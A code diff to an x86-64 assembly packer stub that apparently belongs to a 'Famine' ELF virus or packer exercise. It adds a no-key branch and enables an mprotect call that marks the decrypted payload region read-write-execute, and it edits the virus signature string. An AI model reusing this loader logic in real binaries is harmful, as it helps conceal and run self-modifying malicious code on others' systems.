@@ -15,13 +15,15 @@ global sign_key
 %define PROT_WRITE  0x2
 %define PROT_EXEC   0x4
 
+%define PAGE_SIZE 0x1000
+
 extern end
 
 packer_start:
 	push rdx
 
 	cmp byte [rel key], 0
-	je .print
+	je .print_nokey
 
 	lea rsi, [rel packer_start]
 	add rsi, [rel offset_to_data]
@@ -49,6 +51,9 @@ packer_start:
 .string:
 	db "....WOODY....", 0x0a, 0x0
 
+.stringnokey:
+	db "no key", 0x0a, 0x0
+
 .print:
 	mov rax, 1
 	mov rdi, 1
@@ -57,18 +62,29 @@ packer_start:
 
 	syscall
 
-;.mprotect_data:
-;;; get addr of packer_start
-;	lea rdi, [rel packer_start]
-;	add rdi, [rel offset_to_data]
-;	and rdi, ~0xfff
-;
-;	mov rax, 10
-;	mov rsi, [rel data_page_size]
-;	and rsi, ~0xfff ;remove this shit
-;	mov rdx, PROT_READ | PROT_WRITE | PROT_EXEC
-;
-;	syscall
+	jmp .mprotect_data
+
+.print_nokey:
+	mov rax, 1
+	mov rdi, 1
+	lea rsi, [rel .stringnokey]
+	mov rdx, 8
+
+	syscall
+
+.mprotect_data:
+;; get addr of packer_start
+	lea rdi, [rel packer_start]
+	add rdi, [rel offset_to_data]
+	and rdi, ~(PAGE_SIZE - 1)
+
+	mov rax, 10
+	mov rsi, [rel data_page_size]
+	;and rsi, ~0xfff ;remove this shit
+	mov rdx, PROT_READ | PROT_WRITE | PROT_EXEC
+
+
+	syscall
 
 ;.mproctect_text:
 ;	lea rdi, [rel packer_start]
@@ -87,12 +103,7 @@ jmp_rel:
 	jmp end
 
 sign:
-	db "Famine (c)oded by dxrxbxk - 42424242", 0x0a, 0
-;	;db "Famine (c)oded by dxrxbxk", 0x0a, 0
-sign_key:
-; dec 1 byte
-	db 0x0
-	
+	db "Famine (c)oded by dxrxbxk - straboul:0000", 0x0a, 0
 
 data_page_size:
 	dq 0x0
